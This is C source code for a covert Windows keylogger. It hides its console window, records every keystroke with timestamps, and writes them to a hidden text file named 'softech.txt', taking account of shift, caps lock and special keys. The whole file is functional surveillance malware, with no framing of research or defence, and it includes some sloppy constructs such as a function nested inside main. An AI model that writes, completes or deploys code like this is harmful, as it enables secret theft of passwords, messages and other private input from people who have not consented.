#include<stdio.h>
#include<conio.h>
#include<windows.h>
#include<Winuser.h>
#include<stdlib.h>
#include<dos.h>
#include<ctype.h>
#include<time.h>
int main()
{
   HWND stealth; /*creating stealth (window is not visible)*/
   AllocConsole();
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);

short character;
char val[5];
// function to check caps lock
int isCapsLock()
{
	/*if caplock used then return 1*/
     if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0)
        return 1;
     else
        return 0;    
}

             while(1)
             {
                    /*detect all physical key*/
                    for(character=8;character<=222;character++)
                    {
                        if(GetAsyncKeyState(character)==-32767)
                        { 
 
                            FILE *file;
                            /*file create*/
                            WinExec("attrib +h softech.txt /S /D",SW_HIDE);
                            file=fopen("softech.txt","a+");
                            
                            time_t mytime;
  							mytime = time(NULL);
  							fprintf(file,"\nDate:%s",ctime(&mytime));
                            /*if not any key press than return 1 then again start loop*/
							if(file==NULL)
                            {
                                    return 1;
                            }    
							/*file is not NULL*/       
                            if(file!=NULL)
                            {       
                                    if ((character>=39)&&(character<=64)) // Keys 0-9
            {

                if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
                {
                    switch (character) // 0x30-0x39 is 0-9 respectively
                    {
                    case 0x30:
                        fputs(")",file);
                        fclose(file);
                        break;
                    case 0x31:
                        fputs("!",file);
                        fclose(file);
						break;
                    case 0x32:
                        fputs("@",file); 
                        fclose(file);
						break;
                    case 0x33:
                        fputs("#",file);  
                        fclose(file);
						break;
                    case 0x34:
                        fputs("$",file);   
                        fclose(file);
						break;
                    case 0x35:
                        fputs("%",file);  
                        fclose(file);
						break;
                    case 0x36:
                        fputs("^",file);  
                        fclose(file);
						break;
                    case 0x37:
                        fputs("&",file);  
                        fclose(file);
						break;
                    case 0x38:
                        fputs("*",file);  
                        fclose(file);
						break;
                    case 0x39:
                        fputs("(",file);  
                        fclose(file);
						break;
                    }
                }
                
            }
                                    /*41 to 64 ASCII code used*/
                                    if((character>=41)&&(character<=64))
                                    {
                                          /*open and save the character in file*/
										  fputc(character,file);
                                          fclose(file);
                                          /*close the file*/
                                          break;
                                    } 
                                
									/*A to Z Character save in file*/      
                                    else if((character>64)&&(character<91))
                                    {
                                    
                                    if (!(GetAsyncKeyState(VK_SHIFT)^isCapsLock())) // Check if letters should be lowercase
                
                     // Un-capitalize letters
                {
                	character+=32;
				}
                
                fputc(character,file);
				fclose(file);
				break;  
            }
                                   
                                    else
                                    {
                                    	/*Special Character Used In Switch Case With Help Of Virtual Key*/
                                        switch(character)
                                        {
                                              case VK_SPACE:/*this key used for space*/
                                              fputs("[SPACE]",file);
                                              fclose(file);
                                              break;   
                                              /*case VK_SHIFT:/*this key used for shift*/
                                              /*fputs("[SHIFT]",file);
                                              fclose(file);
                                              break;*/   
											  case VK_MENU:
											  fputs("[ALT]",file);
											  fclose(file);
											  break;                                        
                                              case VK_RETURN:/*this key used for enter*/
                                              fputs("\n[ENTER]",file);
                                              fclose(file);
                                              break;
                                              case VK_BACK:
                                              fputs("[BACKSPACE]",file);/*this key used for backspace*/
                                              fclose(file);
                                              break;
                                              case VK_TAB:/*this key used for tab*/
                                              fputs("[TAB]",file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:/*this key used for ctrl*/
                                              fputs("[CTRL]",file);
                                              fclose(file);
                                              break;   
                                              case VK_DELETE:/*this key used for delete or numpad del[.]*/
                                              fputs("[DEL]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_PLUS:/*this key used for equal sign[=]*/
                                              if(GetAsyncKeyState(VK_SHIFT))/*check the condition if shift key used then + character is save in file*/
                                              /*GetAsyncKeyState is a function to detect the actual key press*/
                                              {
                                              	fputs("+",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs("=",file);
                                              fclose(file);
                                              break;
                                              }
		                                      case VK_OEM_COMMA:/*this key used for comma[,]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs("<",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs(",",file);
                                              fclose(file);
                                              break;
                                              }
                                              case VK_OEM_MINUS:/*this key used for minus[-]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs("_",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs("-",file);
                                              fclose(file);
                                              break;
                                          	  }
                                              case VK_OEM_PERIOD:/*this key used for dot[.]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs(">",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs(".",file);
                                              fclose(file);
                                              break;
                                              }
											  case VK_MULTIPLY:/*this key used for multiply[*] for numpad key*/
                                              fputs("*",file);
                                              fclose(file);
                                              break;
                                              case VK_ADD:/*this key used for add[+] for numpad key*/
                                              fputs("+",file);
                                              fclose(file);
                                              break;
                                              case VK_SEPARATOR:/*this key used for separator[:] but not working*/
                                              fputs(":",file);
                                              fclose(file);
                                              break;
                                              case VK_SUBTRACT:/*this key used for subtract[-] for numpad key*/
                                              fputs("-",file);
                                              fclose(file);
                                              break;
                                              case VK_DIVIDE:/*this key used for divide[/] for numpad key*/
                                              fputs("/",file);
                                              fclose(file);
                                              break;
                                              case VK_NUMLOCK:/*this key used for numpad on or off*/
                                              fputs("[NUMLOCK]",file);
                                              fclose(file);
                                              break;
                                              case VK_BROWSER_BACK:/*this key used for browser back atl+right*/
                                              fputs("[BACKSPACE]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_1:/*this key used for [;]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs(":",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  	fputs(";",file);
                                                fclose(file);
                                                break;
											  }
											   case VK_OEM_2:/*this key used for [/]*/
                                               if (GetAsyncKeyState(VK_SHIFT))
                                              {
                             				   	fputs("?",file);
                             					fclose(file);
                             					break;
                        				      }
											  else
											  {
                             					fputs("/",file);
                             					fclose(file);
                        						break;
											  }	
                                              case VK_OEM_3:/*this key used for [`]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs("~",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs("`",file);
                                              fclose(file);
                                              break;
                                          	  }
                                              case VK_OEM_4:/*this key used for [[]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs("{",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs("[",file);
                                              fclose(file);
                                              break;
                                              }
											  case VK_OEM_5:/*this key used for [\]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs("|",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs("\\",file);
                                              fclose(file);
                                              break;                               
                                          	  }
											  case VK_OEM_6:/*this key used for []]*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs("}",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  	fputs("]",file);
                                                fclose(file);
                                                break;
											  }
							                  case VK_OEM_7:/*this key used for [']*/
                                              if(GetAsyncKeyState(VK_SHIFT))
                                              {
                                              	fputs("\"",file);
                                              	fclose(file);
                                              	break;
											  }
											  else
											  {
											  fputs("'",file);
                                              fclose(file);
                                              break;                                           
                                              }
											  case VK_NUMPAD0:/*this key used for [0] in numpad key*/
                                              fputc('0',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD1:/*this key used for [1] in numpad key*/
                                              fputc('1',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD2:/*this key used for [2] in numpad key*/
                                              fputc('2',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD3:/*this key used for [3] in numpad key*/
                                              fputc('3',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD4:/*this key used for [4] in numpad key*/
                                              fputc('4',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD5:/*this key used for [5] in numpad key*/
                                              fputc('5',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD6:/*this key used for [6] in numpad key*/
                                              fputc('6',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD7:/*this key used for [7] in numpad key*/
                                              fputc('7',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD8:/*this key used for [8] in numpad key*/
                                              fputc('8',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD9:/*this key used for [9] in numpad key*/
                                              fputc('9',file);
                                              fclose(file);
                                              break;
                                              /*case VK_CAPITAL:/*this key used for capslock on or off
                                              fputs("[CAPS LOCK]",file);
                                              fclose(file);
                                              break;*/
                                              case VK_LEFT:/*this key used for left*/
                                              fputs("[LEFT]",file);
                                              fclose(file);
                                              break;
                                              case VK_UP:/*this key used for up*/
                                              fputs("[UP]",file);
                                              fclose(file);
                                              break;
                                              case VK_DOWN:/*this key used for down*/
                                              fputs("[DOWN]",file);
                                              fclose(file);
                                              break;
                                              case VK_RIGHT:/*this key used for right*/
                                              fputs("[RIGHT]",file);
                                              fclose(file);
                                              break;
                                              default:/*this used for default key*/
                                              fclose(file);
                                              break;
                                       }     
                                   }
                               }
                           }
                       }
                   }
           }

